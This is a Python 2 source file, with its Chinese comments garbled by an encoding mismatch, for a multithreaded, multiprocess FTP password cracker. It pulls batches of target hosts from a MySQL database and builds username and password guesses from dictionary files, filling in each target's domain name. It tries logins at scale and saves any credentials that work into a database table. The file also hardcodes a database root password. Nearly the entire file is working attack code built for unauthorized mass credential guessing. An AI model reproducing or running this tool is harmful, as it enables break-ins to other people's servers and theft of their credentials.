# -*- coding: cp936 -*-

from mysql_handle import mysql_handle
from ftplib import FTP
import mysql
from collections import defaultdict, deque
from threading import Thread
import time #��ȡʱ�����ʱ
import socket
socket.setdefaulttimeout(10)

class crack_ftp(mysql_handle):   #����FTP�ƽ���
    def __init__(self):
        mysql_handle.__init__(self,'localhost','root','316118740','urldata')
        #username:pwd
        self.result={}
        self.url_list=[]
        self.ftp_list=[]    #����100��URL��ַ
        self.app_list=[]
        self.mysql_connect()
        self.WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
        self.WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]
    def fetch_array(self):  #��ȡ100��URL��ַ���浽����
        try:
            data="select * from url where ftpsend is NULL limit 100"
            self.mysql_cursor()
            self.cursor.execute(data)
            ftp_list=[]#����100��URL��ַ
            for url in self.cursor:
                ftp_list.append(url[0])#����100��URL��ַ
                #print("url was {}".format(url[0]))
            self.ftp_list=(uu for uu in ftp_list)#����100��URL��ַ
            #self.cnx.commit()
            self.cursor.close()
            return ftp_list
        except mysql.connector.Error as err:
            print("query err: {}".format(err))
    def send_confirm(self,data):
        #'''confirm the url'''
        self.mysql_connect()
        self.mysql_query(data)
    def domain_check(self):
        '''domain argv'''
    def weak_pwd(self):
        pass
    #def scanner(self):
    def get_sdomain(self,domain):  #�������www.baidu.com->baidu.com
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''
    def get_ssdomain(self,domain):  #�������www.baidu.com->baidu
        sdomain = self.get_sdomain(domain)  #�Ƚ���һ��
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian
    def scanner(self,host,nthreads=10,port=21):    #�����ƽ��߳�
        try:
            ftpA = FTP()  #��ʼ��FTP��
            ftpA.connect(host,port)  #���� ��������  �˿ں�
            upf1 = "update url set ftpsend='send' where url='%s'"%(host)
            self.send_confirm(upf1)
            #print "heer"
        except Exception, e:
            #print u"\n%s������FTP21�˿ڿ���û�п���"%host
            upf2 = "update url set ftpsend='====' where url='%s'"%(host)
            print upf2
            #print type(upf2)
            self.mysql_query(upf2)
            return
            #print u"Ҫɨ��IP:",host,
        #�õ�sdomain��ssdomain
        domain = host   #������δʲô��Ҫ��ֵ  ֱ��ʹ��host�������Ϳ�������
        sdomain = self.get_sdomain(domain)  #�������www.baidu.com->baidu.com
        ssdomain = self.get_ssdomain(domain)  #�������www.baidu.com->baidu
        #��ⲻ����ȫ��������һ������  123456.blog.baidu.com.cn   ��������������
        accounts = deque()   #list����
        #׼�� �û���������
        for username in self.WEAK_USERNAME:   #�����û���#WEAK_USERNAME=username.dic
            if  '%domain%' in username or '%sdomain%' in username or '%ssdomain%' in username:
                if sdomain=='':
                    continue  #����
                else:
                    username = username.replace('%domain%',domain)  #���ظ���������ʽ���������滻����ַ����ĸ���
                    username = username.replace('%sdomain%',sdomain)
                    username = username.replace('%ssdomain%',ssdomain)

            for password in self.WEAK_PASSWORD:   #��������#WEAK_PASSWORD=password.dic
                if '%domain%' in password or '%sdomain%' in password or '%ssdomain%' in password:
                    if sdomain=='':
                        continue  #����
                    else:
                        password = password.replace('%domain%',domain)
                        password = password.replace('%sdomain%',sdomain)
                        password = password.replace('%ssdomain%',ssdomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:#list����
                    accounts.append((username,password))#��ӵ� list����
                    ##################################################################
                    #print u"��ϳ�",len(accounts),u" ������"
        if not accounts:   #�����������˾�����
            print u"%s ����������"% host
            #�ڴ��¶�ȡ
            return 0

        print u"ɨ����վFTP:%s ��ʼ\n"% host,

        class crackThread(Thread):
            #�ƽ� �ʻ��߳�
            def __init__(self):
                Thread.__init__(self)
                self.running = True  #����  �����߳�����
                self.ftp = FTP()  #��ʼ��FTP��
                #self.p_p_p=0 #������
                #self.ftp.set_debuglevel(2)  #�򿪵��Լ���2����ʾ��ϸ��Ϣ
            def send_pwd(self,data):
                new=mysql_handle('localhost','root','','urldata')
                print 'send pwd'
                try:
                    new.mysql_connect()
                    new.mysql_cursor()
                    new.cursor.execute(data)
                    #Make sure data is committed to the database
                    new.cnx.commit()
                    new.cursor.close()
                    print("query succ")
                    return True
                except mysql.connector.Error as err:
                    print("query err: {}".format(err))
            def run(self):
                MAX_RETRIES = 10
                retry = 0

                account = None   #None=NULL  ����
                while self.running and accounts:#list����

                    try:
                        self.ftp.connect(domain,port)  #���� ��������  �˿ں�
                    except Exception, e:
                        if retry <= MAX_RETRIES:  #����Ϊ�˿����߳���
                            retry = retry +1    #û��Ҫʹ�����������
                            continue  #����
                        else:
                            self.running = False  #����  �����߳�
                            break   #����

                    print ".",
                    #����ÿ����    Ϊʲôһ���˻�Ҫ����3��  ��
                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1

                        if not account and accounts:#list����
                            account = accounts.pop()   #list����  ���

                        #���Բ�Ҫ����
                        if not account:   #�����������˾�����
                            break   #����

                        #print u'IP:',host,u'�û���:',account[0],u'����:',account[1]
                        #print ".",
                        #print u"����ɨ��%s\r"%host
                        try:
                            self.ftp.connect()
                            self.ftp.login(account[0],account[1])  #����FTP
                            #û���쳣����������һ����ȷ���ʺ�
                            print u'\nFTP���ӳɹ�:IP',host,u"�û�����",account[0],u"���룺",account[1],
                            sqlcc="insert into ftppassword(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                            print sqlcc
                            if (self.send_pwd(sqlcc)):
                                print "add user and pwd succ"
                            else:
                                print 'error'
                            #os.system('python adminFTP.py %s %s %s'%(host,account[0],account[1]))
                            account = None  #None=NULL
                            self.ftp.quit()
                        except Exception, e:
                            emsg = str(e)    #������Ϣ

                            if 'connection' in emsg.lower() or 'tries' in emsg.lower():   #�ж� ����  ʧ�ܴ�����Ϣ    �����׺���
                                retry = retry +1
                                break   #����
                            else:
                                #reset retry
                                account = None  #None=NULL
                                retry = 0

        threads = []  #�߳�
        for i in range(nthreads):  #nthreads=10  ����10���߳�
            threads.append(crackThread())

        for thread in threads:   #���������ʲô��˼    �ǽ����߳���
            thread.start()  #start���ǿ�ʼ�߳�

        for thread in threads:   #���������ʲô��˼    �ǽ����߳���
            thread.join()
        print u"\n================%sɨ�����%s================"%(host,time.strftime('%Y.%m.%d-%H.%M.%S'))
    def schedule(self):
        pass
    def tes(self,fname):
        print fname
    def run(self):
        self.fetch_array()#��ȡ100��URL��ַ���浽����
        for addr in self.ftp_list:#����100��URL��ַ
            print addr
            self.scanner(addr)  #�����ƽ��߳�
import multiprocessing

class multi_ftp(multiprocessing.Process):  #�������̽����ƽ�
    def __init__(self,addr):
        multiprocessing.Process.__init__(self)
        self.addr=addr
    def add_func(self):
        p=crack_ftp()#����FTP�ƽ���
        p.scanner(self.addr)  #�����ƽ��߳�
    def run(self):
        self.add_func()
def process_job(process_num,app_list):  #10   URL����
    process_list=[]
    for i in range(process_num):
        p=multi_ftp(app_list[i])  #�������̽����ƽ�
        process_list.append(p)
    for i in range(process_num):
        process_list[i].daemon=True
        process_list[i].start()
    for i in range(process_num):
        process_list[i].join()
def sche():
    new=crack_ftp()#����FTP�ƽ���
    new.fetch_array()#��ȡ100��URL��ַ���浽����      �ڴ������ʱ��RUN���Ѿ���ȡ��Ϊʲô��Ҫ�ڶ�ȡ��
    app_list=[]
    for i in new.ftp_list:  ##����100��URL��ַ    ��ȡ����
        print i
        i.replace('/','')
        app_list.append(i.strip())
        if len(app_list)==10:
            process_job(10,app_list)
            app_list=[]   #���
if __name__=="__main__":
    for i in range(2000):
        sche()
